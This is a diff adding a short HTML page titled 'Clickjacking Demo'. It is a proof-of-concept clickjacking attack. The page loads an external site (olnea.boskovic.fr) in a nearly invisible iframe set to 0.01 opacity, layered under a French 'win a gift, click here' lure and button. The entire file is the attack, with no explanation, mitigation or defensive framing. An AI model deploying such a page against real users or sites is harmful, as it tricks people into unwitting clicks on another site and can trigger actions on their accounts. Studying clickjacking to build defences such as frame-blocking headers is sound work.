@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Clickjacking Demo</title>
+  <style>
+    iframe {
+      position: absolute;
+      top: 0; left: 0;
+      width: 1024px; height: 768px;
+      opacity: 0.01; /* presque invisible */
+      z-index: 2;
+    }
+    #overlay {
+      position: absolute;
+      top: 0; left: 0;
+      width: 1024px; height: 768px;
+      background: rgba(255, 255, 255, 0.3);
+      z-index: 3;
+      pointer-events: none;
+    }
+    button {
+      position: relative;
+      z-index: 4;
+      margin: 20px;
+      padding: 10px 20px;
+      font-size: 1.2em;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h2>Gagne un cadeau en cliquant ici !</h2>
+  <button>Cliquer ici</button>
+  <iframe src="https://olnea.boskovic.fr"></iframe>
+  <div id="overlay"></div>
+</body>
+</html>
+
+
